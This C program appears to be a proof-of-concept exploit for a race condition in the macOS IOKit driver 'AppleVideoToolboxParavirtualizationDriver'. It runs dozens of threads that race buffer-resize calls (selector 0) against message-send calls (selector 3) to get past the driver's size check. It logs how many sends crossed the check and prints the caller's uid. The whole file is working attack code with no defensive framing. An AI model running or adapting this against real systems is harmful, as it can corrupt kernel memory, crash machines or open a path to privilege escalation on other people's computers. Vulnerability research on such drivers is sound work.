#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <IOKit/IOReturn.h>
#include <mach/mach.h>
#include <pthread.h>
#include <sched.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static const char *kServiceName =
    "AppleVideoToolboxParavirtualizationDriver";

static const kern_return_t kSizeNotPublished = (kern_return_t)0xe0000001;

enum worker_kind {
    kResizeWorker,
    kSendWorker,
};

struct barrier {
    pthread_mutex_t lock;
    pthread_cond_t condition;
    unsigned target;
    unsigned waiting;
    unsigned generation;
};

struct worker {
    io_connect_t connection;
    struct barrier *barrier;
    enum worker_kind kind;
    uint64_t target_size;
    unsigned max_send_attempts;
    unsigned attempts;
    kern_return_t result;
    uint32_t output_count;
    uint64_t output[3];
};

static int barrier_init(struct barrier *barrier, unsigned target) {
    memset(barrier, 0, sizeof(*barrier));
    barrier->target = target;
    if (pthread_mutex_init(&barrier->lock, NULL) != 0) {
        return -1;
    }
    if (pthread_cond_init(&barrier->condition, NULL) != 0) {
        pthread_mutex_destroy(&barrier->lock);
        return -1;
    }
    return 0;
}

static void barrier_wait(struct barrier *barrier) {
    pthread_mutex_lock(&barrier->lock);
    unsigned generation = barrier->generation;
    barrier->waiting++;
    if (barrier->waiting == barrier->target) {
        barrier->waiting = 0;
        barrier->generation++;
        pthread_cond_broadcast(&barrier->condition);
    } else {
        while (generation == barrier->generation) {
            pthread_cond_wait(&barrier->condition, &barrier->lock);
        }
    }
    pthread_mutex_unlock(&barrier->lock);
}

static void barrier_destroy(struct barrier *barrier) {
    pthread_cond_destroy(&barrier->condition);
    pthread_mutex_destroy(&barrier->lock);
}

static kern_return_t resize_buffer(io_connect_t connection, uint64_t size,
                                   uint64_t output[3],
                                   uint32_t *output_count) {
    uint64_t input = size;
    *output_count = 3;
    return IOConnectCallScalarMethod(connection, 0, &input, 1, output,
                                     output_count);
}

static kern_return_t send_message(io_connect_t connection, uint64_t size,
                                  uint64_t *output,
                                  uint32_t *output_count) {
    uint64_t input[6] = {size, 0, 0, 0, 0, 0};
    *output_count = 1;
    return IOConnectCallScalarMethod(connection, 3, input, 6, output,
                                     output_count);
}

static void *race_worker(void *opaque) {
    struct worker *worker = opaque;
    barrier_wait(worker->barrier);

    if (worker->kind == kResizeWorker) {
        worker->result =
            resize_buffer(worker->connection, worker->target_size,
                          worker->output, &worker->output_count);
        worker->attempts = 1;
        return NULL;
    }

    worker->result = kSizeNotPublished;
    for (unsigned attempt = 0; attempt < worker->max_send_attempts;
         attempt++) {
        worker->attempts = attempt + 1;
        worker->result =
            send_message(worker->connection, worker->target_size,
                         &worker->output[0], &worker->output_count);

        /*
         * Before selector 0 publishes the new size, selector 3 returns the
         * driver's private 0xe0000001 error. The first different result has
         * crossed the size check and consumed the current mapping generation.
         */
        if (worker->result != kSizeNotPublished) {
            break;
        }
        if ((worker->attempts & 0xff) == 0) {
            sched_yield();
        }
    }
    return NULL;
}

static io_service_t find_service(void) {
    CFMutableDictionaryRef matching = IOServiceMatching(kServiceName);
    if (matching == NULL) {
        return IO_OBJECT_NULL;
    }
    return IOServiceGetMatchingService(kIOMainPortDefault, matching);
}

int main(int argc, char **argv) {
    unsigned resize_threads = 64;
    unsigned send_threads = 16;
    unsigned max_send_attempts = 1000000;
    uint64_t step = 0x100000;
    uint64_t max_size = 0xa00000;
    const uint64_t baseline_size = 0x1000;

    if (argc > 1) {
        resize_threads = (unsigned)strtoul(argv[1], NULL, 0);
    }
    if (argc > 2) {
        send_threads = (unsigned)strtoul(argv[2], NULL, 0);
    }
    if (argc > 3) {
        step = strtoull(argv[3], NULL, 0);
    }
    if (argc > 4) {
        max_size = strtoull(argv[4], NULL, 0);
    }
    if (argc > 5) {
        max_send_attempts = (unsigned)strtoul(argv[5], NULL, 0);
    }

    if (resize_threads < 2 || resize_threads > 256 || send_threads == 0 ||
        send_threads > 256 || step <= baseline_size ||
        max_size < step || max_size > 0xa00000 ||
        max_send_attempts == 0) {
        fprintf(stderr, "invalid arguments\n");
        return 2;
    }

    io_service_t service = find_service();
    if (service == IO_OBJECT_NULL) {
        fprintf(stderr, "service not found: %s\n", kServiceName);
        return 1;
    }

    io_connect_t connection = IO_OBJECT_NULL;
    kern_return_t kr =
        IOServiceOpen(service, mach_task_self(), 0, &connection);
    if (kr != KERN_SUCCESS) {
        fprintf(stderr, "IOServiceOpen=0x%x\n", kr);
        IOObjectRelease(service);
        return 1;
    }

    uint64_t baseline_output[3] = {0};
    uint32_t baseline_output_count = 3;
    kr = resize_buffer(connection, baseline_size, baseline_output,
                       &baseline_output_count);
    if (kr != KERN_SUCCESS || baseline_output_count != 3) {
        fprintf(stderr, "baseline=0x%x output_count=%u\n", kr,
                baseline_output_count);
        IOServiceClose(connection);
        IOObjectRelease(service);
        return 1;
    }

    unsigned worker_count = resize_threads + send_threads;
    struct worker *workers = calloc(worker_count, sizeof(*workers));
    pthread_t *threads = calloc(worker_count, sizeof(*threads));
    if (workers == NULL || threads == NULL) {
        fprintf(stderr, "allocation failed\n");
        IOServiceClose(connection);
        IOObjectRelease(service);
        return 1;
    }

    printf("uid=%u resize_threads=%u send_threads=%u step=0x%llx "
           "max=0x%llx max_send_attempts=%u\n",
           getuid(), resize_threads, send_threads, step, max_size,
           max_send_attempts);
    fflush(stdout);

    unsigned round = 0;
    for (uint64_t target = step; target <= max_size; target += step) {
        struct barrier barrier;
        if (barrier_init(&barrier, worker_count + 1) != 0) {
            fprintf(stderr, "barrier_init failed\n");
            break;
        }

        memset(workers, 0, worker_count * sizeof(*workers));
        for (unsigned i = 0; i < worker_count; i++) {
            workers[i].connection = connection;
            workers[i].barrier = &barrier;
            workers[i].kind =
                i < send_threads ? kSendWorker : kResizeWorker;
            workers[i].target_size = target;
            workers[i].max_send_attempts = max_send_attempts;
            if (pthread_create(&threads[i], NULL, race_worker, &workers[i]) !=
                0) {
                fprintf(stderr, "pthread_create failed at worker %u\n", i);
                _exit(3);
            }
        }

        barrier_wait(&barrier);
        for (unsigned i = 0; i < worker_count; i++) {
            pthread_join(threads[i], NULL);
        }
        barrier_destroy(&barrier);

        unsigned resize_failures = 0;
        unsigned send_crossed = 0;
        unsigned send_capped = 0;
        unsigned long long total_send_attempts = 0;
        kern_return_t first_send_result = workers[0].result;
        uint64_t first_send_output = workers[0].output[0];

        for (unsigned i = 0; i < worker_count; i++) {
            if (workers[i].kind == kResizeWorker) {
                if (workers[i].result != KERN_SUCCESS ||
                    workers[i].output_count != 3) {
                    resize_failures++;
                }
            } else {
                total_send_attempts += workers[i].attempts;
                if (workers[i].result != kSizeNotPublished) {
                    send_crossed++;
                } else {
                    send_capped++;
                }
            }
        }

        printf("round=%u target=0x%llx resize_fail=%u "
               "send_crossed=%u send_capped=%u attempts=%llu "
               "first_kr=0x%x first_out=0x%llx\n",
               round, target, resize_failures, send_crossed, send_capped,
               total_send_attempts, first_send_result, first_send_output);
        fflush(stdout);

        if (resize_failures != 0) {
            break;
        }
        round++;

        if (UINT64_MAX - target < step) {
            break;
        }
    }

    free(threads);
    free(workers);
    IOServiceClose(connection);
    IOObjectRelease(service);
    return 0;
}
